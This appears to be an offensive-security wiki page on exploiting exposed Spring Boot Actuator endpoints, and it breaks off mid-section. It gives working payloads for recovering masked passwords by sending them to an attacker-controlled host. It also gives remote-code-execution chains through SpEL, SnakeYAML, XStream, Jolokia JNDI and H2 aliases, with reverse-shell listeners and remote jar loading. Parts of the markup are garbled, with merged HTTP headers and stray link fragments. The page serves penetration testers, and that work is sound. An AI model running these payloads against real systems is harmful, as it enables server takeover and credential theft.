---
title: Spring Boot
badge: Java
description: Spring Boot related vulnerability learning materials, collection of utilization methods and skills, black box security assessment checklist
---


## Routing Knowledge

- The root path of the default built-in routing in Spring Boot **1.x** starts `/`, and in **2.x**, it starts with `/actuator`.
- Some programmers will customize `/manage`, `/management` or the project-related name is the root path
- The default built-in route name, such as `/env`. Sometimes it will be modified by the programmer, such as modified to `/appenv`

## Version Knowledge

Spring Cloud builds services based on Spring Boot and provides an ordered collection of frameworks that help to rapidly develop distributed systems with common functions such as configuration management, service registration and discovery, and intelligent routing.

### Version Interdependencies of Common Components:

| dependencies | Version list and dependent component versions |
| --- | --- |
| spring-boot-starter-parent | [spring-boot-starter-parent](https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent) |
| spring-boot-dependencies | [spring-boot-dependencies](https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies) |
| spring-cloud-dependencies | [spring-cloud-dependencies](https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies) |

### Dependencies between Spring Cloud and Spring Boot major versions:

| Spring Cloud | Spring Boot |
| --- | --- |
| Angel | Compatible with Spring Boot 1.2.x |
| Brixton | Compatible with Spring Boot 1.3.x, 1.4.x |
| Camden | Compatible with Spring Boot 1.4.x, 1.5.x |
| Dalston | Compatible with Spring Boot 1.5.x, not compatible with 2.0.x |
| Edgware | Compatible with Spring Boot 1.5.x, not compatible with 2.0.x |
| Finchley | Compatible with Spring Boot 2.0.x, not compatible with 1.5.x |
| Greenwich | Compatible with Spring Boot 2.1.x |
| Hoxton | Compatible with Spring Boot 2.2.x |

### The Suffix and Meaning of the Spring Cloud Minor Version Number:

| Version number suffix | Meaning |
| --- | --- |
| BUILD-SNAPSHOT | Snapshot version, the code is not fixed, it is changing |
| MX | Milestone Edition |
| RCX | Release Candidate |
| RELEASE | official release |
| SRX | (fixed bugs and bugs and re-released) official release |

## Information Leakage

### Leakage of routing address and interface call details

> When the development environment was switched to the online production environment, the relevant personnel did not change the configuration file or forgot to switch the configuration environment, resulting in this vulnerability

Directly access the following routes to verify whether the vulnerability exists:

```
/api-docs
/v2/api-docs
/swagger-ui.html
```

Some interface routing distortions that may be encountered:
```
/api.html
/sw/swagger-ui.html
/api/swagger-ui.html
/template/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
```

In addition, the following routes sometimes contain (or infer) some interface address information, but cannot obtain parameter-related information:

```
/mappings
/actuator/mappings
/metrics
/actuator/metrics
/beans
/actuator/beans
/configprops
/actuator/configprops
```

**Generally speaking, knowing the relevant interface and parameter information of the spring boot application cannot be regarded as a vulnerability.**

However, the exposed interfaces can be checked for unauthorized access, unauthorized access, or other business-type vulnerabilities.

### Route Exposed by Improper Configuration

> Mainly because programmers did not realize that exposing routing may cause security risks when developing, or did not develop in accordance with standard procedures, and forgot to modify/switch the configuration of the production environment when going online

Referring to [production-ready-endpoints](https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints) and [spring-boot.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt), the default built-in routes that may be exposed due to improper configuration

```txt[spring-boot.txt]
/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/beans
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/httptrace
/actuator/mappings
/actuator/jolokia
/actuator/hystrix.stream
```

Among them, the most important interfaces for finding vulnerabilities are:

- `/env` and `/actuator/env`
  - GET requests /env will leak environment variable information or some usernames in the configuration. When the programmer's attribute names are not standardized (for example, the password is written as passwords, PWD), the plaintext of the password will be leaked.
  - At the same time, there is a certain probability that some attributes can be set through the POST request /env interface to trigger related RCE vulnerabilities.

- `/Jolokia`
  - Find exploitable MBeans through the /jolokia/list interface to trigger related RCE vulnerabilities;

- `/trace`
  - Some http request packets access tracking information, it is possible to find valid cookie information

### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 1)

When accessing the /env interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization

#### Conditions of use:
- Target website exists /jolokiaor /actuator/jolokiainterface.
- The target uses Jolokia-core dependencies (version requirements are currently unknown)

#### Steps to use:

1. Find the property name you want to get
  - GET requests the /env or /actuator/env interface of the target website, search for ******keywords, and find the attribute name corresponding to the attribute value masked by the asterisk * to be obtained.

2. Jolokia calls the relevant MBean to get the plaintext

  - **security.user.password** Replace in the following example with the actual property name to be obtained, and send the packet directly; the result of the plaintext value is included in the value key in the response packet.

3. **Invoke org.springframework.bootMbean**( maybe more generic )

In fact, it calls the getProperty method of the **org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar** class instance

**spring 1.x**

```http
POST /jolokia HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["{{ attribute security.user.password }}"]}
```

**spring 2.x**
```http
POST /actuator/jolokia HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["{{ attribute security.user.password }}"]}
```

4. **Call org.springframework.cloud.context.environmentMbean **( requires spring cloud related dependencies )
   - In fact, it calls the getProperty method of the org.springframework.cloud.context.environment.EnvironmentManager class instance

**spring 1.x**

```http
POST /jolokia HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["{{ attribute security.user.password }}"]}
```

**spring 2.x**

```http
POST /actuator/jolokia HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["{{ attribute security.user.password }}"]}
```


### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 2)

When accessing the /env interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization

#### Conditions of use:

- GET request to the target website/env
- can POST requests to the target website/env
- You can POST request the /refreshinterface refresh the configuration ( spring-boot-starter-actuatordependency exists)
- The target uses a spring-cloud-starter-netflix-eureka-clientdependency.
- The target can request the attacker's server (the request can go out of the Internet)

#### Steps to use:

1. Find the property name you want to get
   - GET requests the /envor /actuator/envinterface of the target website, search for ******keywords, and find the attribute name corresponding to the attribute value masked by the asterisk * to be obtained.

2. Use nc to listen for HTTP requests
   - Listen to port 80 on the external network server controlled by yourself. It can be your Burp collaborator, interact.sh, the classic `nc -nlvp 80` or `httpdump :80` ([httpdump on Github](https://github.com/luastan/httpdump))

3. Set the eureka.client.serviceUrl.defaultZone property
   - Replace in the following with the attribute name masked by the corresponding asterisk* you want to get:

**spring 1.x**
```http
POST /env HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://value:${{{ attribute security.user.password }}}@{{ collaborator your.burpcollaborator.net }}
```

**spring 2.x**

```http
POST /actuator/env HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content- Type : application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${{{ attribute security.user.password }}}@{{ collaborator your.burpcollaborator.net }}"}
```

4. Refresh the configuration:

**spring 1.x**

```http
POST /refresh HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content-Type: application/x-www-form-urlencoded
```

**spring 2.x**

```http
POST /actuator/refresh HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content-Type: application/json
```

5. Decode the attribute value

Normally, the server monitored by nc will receive the request from the target, which contains the following Authorizationheader content:

```http
Authorization: Basic dmFsdWU6MTIzNDU2
```

Decode the `dmFsdWU6MTIzNDU2` part of it using base64 to obtain a similar plaintext value `value:123456`, where `123456` is the plaintext of the attribute value before desensitization of the target asterisk*.

### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 3)

When accessing the `/env` interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization

#### Conditions of use:

- `/envTrigger` the target to initiate any http request to the specified address on the external network by setting the attribute through `POST`.
- The target can request the attacker's server (the request can go out of the Internet).

#### Steps to use:

- Referring to what was proposed by UUUUnotfound, you can use placeholders to bring out data in the URL path when the target sends an external http request

1. Find the property name you want to get
   - GET requests the `/env` or `/actuator/envinterface` of the target website, search for ******keywords, and find the attribute name corresponding to the attribute value masked by the asterisk * to be obtained.

2. Set up a listener for HTTP requests
   - Listen to port 80 on the external network server controlled by yourself. It can be your Burp collaborator, interact.sh, a classic `nc -nlvp 80` or `httpdump :80` ([httpdump on Github](https://github.com/luastan/httpdump))

3. Trigger an outgoing http request
   - Using the **spring.cloud.bootstrap.location** method ( also applicable to the case where there are special URL characters in the plaintext data):

**spring 1.x**
```http
POST /env HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content-Type:application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/${{{ attribute security.user.password }}}
```

**spring 2.x**

```http
POST /actuator/env HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://{{ collaborator your.burpcollaborator.net }}/?{{{ attribute security.user.password }}}"}
```

- **eureka.client.serviceUrl.defaultZone** Method ( not applicable when there are special URL characters in plaintext data):

**spring 1.x**

```
POST /env HTTP/1.1
Host: {{ target-domain vulnerable.net }}
Content-Type: application/x-www-form-urlencoded
```

**spring 2.x**

|

POST /actuator/env

Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://{{ collaborator your.burpcollaborator.net }}/${security.user.password}"}

 |

**Step 4: **Refresh the configuration

**spring 1.x\
**

```
POST /refreshContent - Type : application/x- www- form - urlencoded
```

**spring 2.x\
**

```
POST /actuator/ refreshContent- Type: application/json
```

[](https://www.blogger.com/#)

### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 4)

- When accessing the /env interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization

[](https://www.blogger.com/#)**Conditions of use:**

- Normal GET request-target /heapdumpor /actuator/heapdumpinterface

**[](https://www.blogger.com/#)How to use:**\
[](https://www.blogger.com/#)**Step 1:** Find the property name you want to get

- GET requests the /envor /actuator/envinterface of the target website, search for ******keywords, and find the attribute name corresponding to the attribute value masked by the asterisk * to be obtained.

**Step 2:** Download JVM heap information

- The size of the downloaded heap dump file is usually between 50M and 500M, and sometimes it may be larger than 2G

- GET Request the target's /heapdumpor /actuator/heapdumpinterface to download the application's real-time JVM heap information

[](https://www.blogger.com/#)**Step 3: **Use MAT to get the password plaintext in the JVM heap

- Refer to the [article](https://landgrey.me/blog/16/) method, use the OQL statement of the [Eclipse Memory Analyzer](https://www.eclipse.org/mat/downloads.php) select * from org.springframework.web.context.support.StandardServletEnvironment tool to assist in fast filtering and analysis, and obtain the password plaintext

Remote Code Execution
---------------------

Since spring boot related vulnerabilities may be caused by the combination of multiple component vulnerabilities, some vulnerabilities are not named properly, whichever can be distinguished

### White Label Error Page SpEL RCE

**[](https://www.blogger.com/#)Conditions of use:**\
spring-boot 1.1.0-1.1.12, 1.2.0-1.2.7, 1.3.0 are Know at least one interface and parameter name that triggers the default error page of spring-boot\
[](https://www.blogger.com/#)

**How to use:**\
[](https://www.blogger.com/#)**Step 1:** Find a normal transmission location

- For example, if a visit is found /article?id=xxx, the page will report an error with a status code of 500: Whitelabel Error Page and subsequent payloads will be tried at the parameter id.

[](https://www.blogger.com/#)**Step 2:** Execute the SpEL expression

- Enter /article?id=${7*7}, if it is found that the error page calculates the value 49 of 7*7 and displays it on the error page, then it can be basically determined that the target has a SpEL expression injection vulnerability.

Convert from string format to 0x**java byte format for easy execution of arbitrary code:

```
# coding: utf-8result = ""target = 'open -a Calculator'for x in target:result += hex(ord(x)) + ","print(result.rstrip( ',' ))
```

[](https://www.blogger.com/#)

execute open -a Calculator command

|

${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}

 |

#### Vulnerability Principle:

- spring-boot processing parameter value error, the process enters the org.springframework.util.PropertyPlaceholderHelperclass

- At this point, the parameter value in the URL will be recursively parsed with the parseStringValuemethod

- ${} The content enclosed in it will be parsed and executed by org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfigurationthe resolvePlaceholdermethod as a SpEL expression, resulting in an RCE vulnerability

[](https://www.blogger.com/#)

#### Vulnerability Analysis:

- [SpringBoot SpEL Expression Injection Vulnerability - Analysis and Reproduction](<https://cdmana.com/2021/06/20210611111018700V.html>)

**Vulnerable environment:**

[repository/springboot-spel-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce)

Normal access:

```
http://127.0.0.1:9091/article?id=66 _
```

Execute the open -a Calculatorcommand :

|

http: //127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20 ,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}

 |

### Spring Cloud SnakeYAML RCE

**[](https://www.blogger.com/#)Conditions of use:**

- You can POST requests to the /envinterface set properties

- You can POST request the /refreshinterface refresh the configuration ( spring-boot-starter-actuatordependency exists)

- spring-cloud-starter version of target dependency < 1.3.0.RELEASE

- The target can request the attacker's HTTP server (the request can go out of the Internet)

[](https://www.blogger.com/#)**How to use:**

[](https://www.blogger.com/#)**Step 1:** Host yml and jar files

Open a simple HTTP server on the VPS machine you control, and try to use common HTTP service ports (80, 443)

```
# Use python to quickly start the http serverpython2 -m SimpleHTTPServer 80python3 -m http.server 80
```

Place yml an example.ymlfollowing contents:

```
!! javax.script.ScriptEngineManager [    !! java.net.URLClassLoader [[       !! java.net.URL [ " http : //your-vps-ip/example.jar " ] _ _ _ _ _ _    ]]]
```

Place jara . The content is the code to be executed. Please refer to [yaml-payload](https://github.com/artsploit/yaml-payload)example.jar for how to write and compile the code.

[](https://www.blogger.com/#)\
[](https://www.blogger.com/#)**Step 2:** Set the spring.cloud.bootstrap.location property

**spring 1.x**

```
POST /envContent - Type : application/x- www- form - urlencodedspring.cloud.bootstrap.location =http : //your-vps-ip/example.yml
```

**spring 2.x**

**\
**

```
POST /actuator/ envContent- Type: application/json{ "name" : "spring.cloud.bootstrap.location" , " value" : " http : //your-vps-ip/example.yml"}
```

[](https://www.blogger.com/#)**Step 3:** Refresh the configuration

**spring 1.x\
**

**\
**

```
POST /refreshContent - Type : application/x- www- form - urlencoded
```

**spring 2.x\
**

```
POST /actuator/ refreshContent- Type: application/json
```

#### Vulnerability Principle:

- The spring.cloud.bootstrap.location property is set to the URL address of the external malicious yml file

- refresh triggers the target machine to request the yml file on the remote HTTP server and get its content

- SnakeYAML has a deserialization vulnerability, so it will complete the specified action when parsing malicious yml content

- First, trigger java.net.URL to pull the malicious jar file on the remote HTTP server

- Then look for the class in the jar file that implements the javax.script.ScriptEngineFactory interface and instantiate it

- Execute malicious code when instantiating a class, causing RCE vulnerability

**[](https://www.blogger.com/#)Vulnerability Analysis:**

[Exploit Spring Boot Actuator Spring Cloud Env study notes](<https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/)>

[](https://www.blogger.com/#)**Vulnerable environment:\
**\
[repository/springcloud-snakeyaml-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce)

**Normal Access:**

**\
**

```
http://127.0.0.1:9092/env _
```

### Eureka XStream Deserialization RCE

**[](https://www.blogger.com/#)Conditions of use:**

- You can POST requests to the /envinterface set properties

- You can POST request the /refreshinterface refresh the configuration ( spring-boot-starter-actuatordependency exists)

- eureka-client< spring-cloud-starter-Netflix-eureka-client1.8.7 used by the target (usually included in dependencies)

- The target can request the attacker's HTTP server (the request can go out of the Internet)

[](https://www.blogger.com/#)**How to use:**\
[](https://www.blogger.com/#)**Step 1:** Set up a website that responds to a malicious XStream payload

- [Provide an example of a python script](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py) that relies on Flask and meets the requirements, and uses the python that comes with the target Linux machine to bounce the shell.

- Use python to run the above script on the server you control, and modify the ip address and port number of the rebound shell in the script according to the actual situation.

[](https://www.blogger.com/#)**Step 2:** Listen to the port of the bouncing shell

- Generally, use nc to listen to the port and wait for the rebound shell

```
nc -lvp 443
```

[](https://www.blogger.com/#)**Step 3:** Set the eureka.client.serviceUrl.defaultZone property

**spring 1.x**

```
POST /envContent-Type: application/x-www-form-urlencodedeureka .client .serviceUrl .defaultZone =http: //your-vps-ip/example
```

**spring 2.x\
**

```
POST /actuator/ envContent- Type: application/json{ "name" : "eureka.client.serviceUrl.defaultZone" , "value" : " http :// your - vps - ip / example " }
```

[](https://www.blogger.com/#)**Step 4:** Refresh the configuration

**spring 1.x\
**

```
POST /refreshContent - Type : application/x- www- form - urlencoded
```

**spring 2.x**

```
POST /actuator/ refreshContent- Type: application/json
```

#### Vulnerability Principle:

- The eureka.client.serviceUrl.defaultZone property is set to the malicious external eureka server URL address

- refresh triggers the target machine to request a remote URL, and the fake eureka server set up in advance will return a malicious payload

- The target machine is dependent on parsing the payload, triggering XStream deserialization, resulting in RCE vulnerability

[](https://www.blogger.com/#)Vulnerability Analysis:[Spring Boot Actuator unauthorized access getshell](<https://blog.spacepatroldelta.com/a?ID=01700-3336c2ff-7e5a-46b0-ad01-aa935faff8fa>)

[](https://www.blogger.com/#)Vulnerable environment:

[repository/springboot-eureka-xstream-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce)

Normal access:

```
http://127.0.0.1:9093/env _
```

[](https://www.blogger.com/#)

### Jolokia Logback JNDI RCE

**Conditions of use:**

- Target website exists /jolokiaor /actuator/jolokiainterface

- The target uses jolokia-core dependencies (version requirements are currently unknown) and related MBeans exist in the environment

- The target can request the attacker's HTTP server (the request can go out of the Internet)

- JNDI injection is affected by the target JDK version, JDK < 6u201/7u191/8u182/11.0.1 (LDAP method)

**How to use:\
**[](https://www.blogger.com/#)

**Step 1:** View Existing MBeans

- Visit the /jolokia/listinterface to see if the ch.qos.logback.classic.jmx.JMXConfiguratorand reloadByURLkeywords exist.

[](https://www.blogger.com/#)**Step 2:** Host the XML file

- Open a simple HTTP server on the VPS machine you control, and try to use common HTTP service ports (80, 443)

```
# Use python to quickly start the http serverpython2 -m SimpleHTTPServer 80python3 -m http.server 80
```

Place a file XML ending the example.xml following content:

```
< configuration >    < insertFromJNDI env-entry-name = "ldap://your-vps-ip:1389/JNDIObject" as = "appName" /></ configuration >
```

[](https://www.blogger.com/#)**Step 3: **Prepare the Java code for execution

- [Write an optimized Java sample code](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java) to bounce the shell JNDIObject.java, Compile in a way compatible with lower versions of JDK:

```
javac - source 1.5 -target 1.5 JNDIObject.java
```

Then copy the generated JNDIObject.classfile to the root directory of the website in step 2 .\
[](https://www.blogger.com/#)Step 4: Set up a malicious LDAP service

Download [marshalsec](https://github.com/mbechler/marshalsec) and use the following commands to set up the corresponding ldap service:

|

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer [http://your-vps-ip:80/](http://your-vps-ip/)#JNDIObject 1389

 |

**Step 5:** Listen to the port of the bouncing shell

Generally, use nc to listen to the port and wait for the rebound shell

```
nc -lv 443
```

[](https://www.blogger.com/#)**Step 6: **Load the log configuration file from an external URL

- If the target successfully requests example.xml and marshalsec also receives the target request, but the target does not request JNDIObject.class, the high probability is that the JDK version of the target environment is too high, resulting in the failure of JNDI utilization.

Replacing the actual your-vps-ip address to access the URL triggers the vulnerability:

|  |

/jolokia/exec/ch .qos .logback .classic :Name=default,Type=ch .qos .logback .classic .jmx .JMXConfigurator /reloadByURL/http:!/!/your-vps-ip!/example.xml

 |

[](https://www.blogger.com/#)

#### Vulnerability Principle:

- Directly accessing the URL that can trigger the vulnerability is equivalent to calling the method of the ch.qos.logback.classic.jmx.JMXConfiguratorclass through jolokiareloadByURL

- The target machine requests the URL address of the external log configuration file to obtain the content of the malicious xml file.

- The target machine uses saxParser.parse to parse the xml file (this leads to the xxe vulnerability)

- The external JNDI server address is set using the dependent tag in the logbackxml fileinsertFormJNDI

- The target machine requests a malicious JNDI server, resulting in JNDI injection and RCE vulnerability

[](https://www.blogger.com/#)

#### Vulnerability Analysis:

- [spring boot actuator rce via jolokia](<https://www.veracode.com/blog/research/exploiting-spring-boot-actuators>)

[](https://www.blogger.com/#)**Vulnerable environment:\
**\
[repository/springboot-jolokia-logback-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce)

Normal access:

```
http://127.0.0.1:9094/env _
```

[](https://www.blogger.com/#)

### Jolokia Realm JNDI RCE

**Conditions of use:**

- Target website exists /jolokiaor /actuator/jolokiainterface

- The target uses jolokia-coredependencies (version requirements are currently unknown) and related MBeans exist in the environment

- The target can request the attacker's server (the request can go out of the Internet)

- JNDI injection is affected by the target JDK version, jdk < 6u141/7u131/8u121 (RMI way)

**How to use:**\
[](https://www.blogger.com/#)**Step 1: **View Existing MBeans

- Visit the /jolokia/listinterface to see if the type=MBeanFactoryand createJNDIRealmkeywords exist.

[](https://www.blogger.com/#)**Step 2:** Prepare the Java code for execution

- [Write optimized Java sample code](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java) to bounce the shell JNDIObject.java.

[](https://www.blogger.com/#)**Step 3: **Managed class files

Open a simple HTTP server on the vps machine you control, and try to use common HTTP service ports (80, 443)

```
# Use python to quickly start the http serverpython2 -m SimpleHTTPServer 80python3 -m http.server 80
```

Copy the compiled class file in step 2 to the root directory of the HTTP server.\
[](https://www.blogger.com/#)**Step 4: **Set up malicious rmi service

Download [marshalsec](https://github.com/mbechler/marshalsec) and use the following commands to set up the corresponding rmi service:

|

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer [http://your-vps-ip:80/](http://your-vps-ip/)#JNDIObject 1389

 |

**Step 5:** Listen to the port of the bouncing shell

Generally, use nc to listen to the port and wait for the rebound shell

```
nc -lvp 443
```

[](https://www.blogger.com/#)**Step 6: **Send malicious payload

- [Modify the target address, RMI address, port, and other information in the spring-boot-realm-jndi-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py) script according to the actual situation, and then run it on the server you control.

[](https://www.blogger.com/#)

#### Vulnerability principle:

- Use jolokia to call createJNDIRealm to create JNDIRealm

- Set the connectionURL address to RMI Service URL

- Set context factory to RegistryContextFactory

- Stop Realm

- Start Realm to trigger JNDI injection of specified RMI address, causing RCE vulnerability

[](https://www.blogger.com/#)

#### Vulnerability Analysis:

- [Yet Another Way to Exploit Spring Boot Actuators via Jolokia (<https://www.veracode.com/blog/research/exploiting-spring-boot-actuators>)\
[](https://www.blogger.com/#)**Vulnerable environment:\
**\
[repository/springboot-jolokia-logback-rce](https://www.blogger.com/#)

Normal access:

```
http://127.0.0.1:9094/env _
```

### h2 Database Query RCE

**[](https://www.blogger.com/#)Conditions of use:**

- You can POST requests to the /envinterface set properties

- You can restart the application by POST requesting the /restartinterface (there is a spring-boot-starter-actuator dependency)

- Existing com.h2database.h2dependencies (version requirements are currently unknown)

**How to use:**\
[](https://www.blogger.com/#)**Step 1:** Set the spring.datasource.hikari.connection-test-query property

- The 'T5' method in the payload below needs to be renamed (such as T6) after each command is executed before it can be recreated and used, otherwise, the vulnerability will not be triggered when the application is restarted next time

**spring 1.x (execute the command without echo)**

|

POST /env

Content-Type: application/x-www-form-urlencoded

spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');

 |

**\
**

**spring 2.x (execute command without echo)**

|

1

2

3

4

5

 |

POST /actuator/env

Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}

 |\
[](https://www.blogger.com/#)**Step 2: **Restart the application

**spring 1.x\
**

```
POST /restartContent-Type: application/x-www-form-urlencoded
```

**spring 2.x\
**

```
POST /actuator/restartContent-Type: application/json
```

#### Vulnerability Principle:

- The spring.datasource.hikari.connection-test-query property is set to a malicious SQL statement that CREATE ALIAScreates a custom function

- Its properties correspond to the connectionTestQuery configuration of the HikariCP database connection pool and define the SQL statement to be executed before a new database connection

- restart restarts the application, a new database connection will be established

- If the custom function in the SQL statement has not been executed, the custom function will be executed, resulting in RCE vulnerability

#### Vulnerability Analysis:

[](https://www.blogger.com/#)

- [remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](<https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database>)

[](https://www.blogger.com/#)Vulnerable environment:

[repository/springboot-h2-database-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce)

Normal access:

```
http://127.0.0.1:9096/actuator/env _ _ _ _ _ _ _ _
```

### h2 Database Console JNDI RCE

[](https://www.blogger.com/#)**Conditions of use:**

- Existing com.h2database.h2dependencies (version requirements are currently unknown)

- Enable h2 console in spring configuration spring.h2.console.enabled=true

- The target can request the attacker's server (the request can go out of the Internet)

- JNDI injection is affected by the target JDK version, jdk < 6u201/7u191/8u182/11.0.1 (LDAP method)

**How to use:**

[](https://www.blogger.com/#)**Step 1**: Access the route to get session id

- Directly access the target to open the default route of h2 console /h2-console, the target will jump to the page /h2-console/login.jsp?jsessionid=xxxxxxand record the actual jsessionid=xxxxxxvalue 

[](https://www.blogger.com/#)**Step 2:** Prepare the Java code for execution

[Write an optimized Java sample code](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java) to bounce the shell JNDIObject.java,

Compile in a way compatible with lower versions of JDK:

```
javac - source 1.5 -target 1.5 JNDIObject.java
```

Then copy the generated JNDIObject.classfile to the root directory of the website in step 2.\
[](https://www.blogger.com/#)**Step 3:** Managed class files

Open a simple HTTP server on the vps machine you control, and try to use common HTTP service ports (80, 443)

```
# Use python to quickly start the http serverpython2 -m SimpleHTTPServer 80python3 -m http.server 80
```

Copy the compiled class file in step 2 to the root directory of the HTTP server.\
[](https://www.blogger.com/#)**Step 4: **Set up a malicious LDAP service

Download [marshalsec](https://github.com/mbechler/marshalsec) and use the following commands to set up the corresponding LDAP service:

|

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer [http://your-vps-ip:80/](http://your-vps-ip/)#JNDIObject 1389

 |

[](https://www.blogger.com/#)**Step 5:** Listen to the port of the bounce shell

Generally, use nc to listen to the port and wait for the rebound shell

```
nc -lv 443
```

**Step 6: **Send a packet to trigger JNDI injection

- According to the actual situation, replace jsessionid=xxxxxx, and in the following data www.example.com ldap://your-vps-ip:1389/JNDIObject

|

POST /h2-console/login.do?jsessionid=xxxxxx

Host: [www.example.com](http://www.example.com/)

Content-Type: application/x-www-form-urlencoded

Referer: <http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx>

language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=ldap://your-vps-ip:1389/JNDIObject&user=&password=

 |

[](https://www.blogger.com/#)

#### Vulnerability Analysis:

- [Spring Boot + H2 Database JNDI Notes](<https://www.baeldung.com/spring-boot-h2-database>)

[](https://www.blogger.com/#)Vulnerable environment:

[repository/springboot-h2-database-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce)

Normal access:

```
http://127.0.0.1:9096/h2-console _
```

### MySQL Jdbc Deserialization RCE

**[](https://www.blogger.com/#)Conditions of use:**

- You can POST requests to the /envinterface set properties

- You can POST request the /refreshinterface refresh the configuration ( spring-boot-starter-actuatordependency exists)

- A MySQL-connector-javadependency

- The target can request the attacker's server (the request can go out of the Internet)

**[](https://www.blogger.com/#)How to use:**\
[](https://www.blogger.com/#)**Step 1:** View environment dependencies

- GET request /envor /actuator/env, search for mysql-connector-java keywords , and record its version number (5.x or 8.x);

- Search and observe whether there are common deserialization gadget dependencies in environment variables, such as commons-collections, Jdk7u21, Jdk8u20etc.;

- Search for the spring.datasource.urlkeyword and record its value value to facilitate subsequent recovery of its normal JDBC url value.

**[](https://www.blogger.com/#)Step 2:** Set up a malicious rogue MySQL server

